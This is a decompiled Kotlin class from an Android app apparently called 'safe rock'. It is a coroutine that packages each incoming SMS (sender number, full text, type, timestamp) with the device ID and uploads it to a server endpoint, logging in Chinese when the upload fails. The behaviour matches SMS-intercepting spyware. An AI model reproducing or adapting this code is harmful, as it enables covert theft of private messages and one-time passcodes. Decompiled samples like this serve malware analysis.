package com.storm.safe.rock.network;

import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.network.HttpManager$uploadIncomingSms$2", m214403f = "HttpManager.kt", m214404l = {249}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class HttpManager$uploadIncomingSms$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52223a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0268a1 f52224a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52225a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f52226a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f52227a5;

    /* renamed from: a6 */
    public final /* synthetic */ long f52228a6;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public HttpManager$uploadIncomingSms$2(C0268a1 c0268a1, String str, String str2, String str3, long j, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52224a2 = c0268a1;
        this.f52225a3 = str;
        this.f52226a4 = str2;
        this.f52227a5 = str3;
        this.f52228a6 = j;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new HttpManager$uploadIncomingSms$2(this.f52224a2, this.f52225a3, this.f52226a4, this.f52227a5, this.f52228a6, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((HttpManager$uploadIncomingSms$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        Object objM213507a7;
        C0268a1 c0268a1 = this.f52224a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52223a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                JSONObject jSONObject = new JSONObject();
                String str = this.f52225a3;
                String str2 = this.f52226a4;
                String str3 = this.f52227a5;
                long j = this.f52228a6;
                jSONObject.put("deviceId", c0268a1.f52279a2);
                jSONObject.put("number", str);
                jSONObject.put("text", str2);
                jSONObject.put("type", str3);
                jSONObject.put("timestamp", j);
                this.f52223a1 = 1;
                objM213507a7 = c0268a1.m211371a1("/api/sync/inbox", jSONObject, true, this);
                if (objM213507a7 == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                objM213507a7 = ((Result) obj).f57559a0;
            }
        } catch (Exception e) {
            t60.m214705c6("HttpManager", "上传实时短信失败", e);
            int i2 = Result.f57558a1;
            objM213507a7 = kg1.m213507a7(e);
        }
        return new Result(objM213507a7);
    }
}
